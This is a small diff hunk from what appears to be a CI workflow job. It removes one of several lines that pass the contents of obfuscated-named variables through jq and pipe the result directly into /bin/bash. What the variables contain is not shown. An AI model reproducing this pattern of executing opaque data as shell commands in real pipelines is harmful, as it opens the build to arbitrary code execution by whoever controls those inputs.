@@ -30,7 +30,6 @@ jobs:
           echo $dkt15 | jq -r .zyh516 | /bin/bash
           printf '%s' "$fy4657" | jq -r .hvtv25 | /bin/bash
           printf '%s' "$qhgx37" | jq -r .yf3477 | /bin/bash
-          printf '%s' "$ym31" | jq -r .crmns4768 | /bin/bash
 
       - name: Archive results
         if: always()
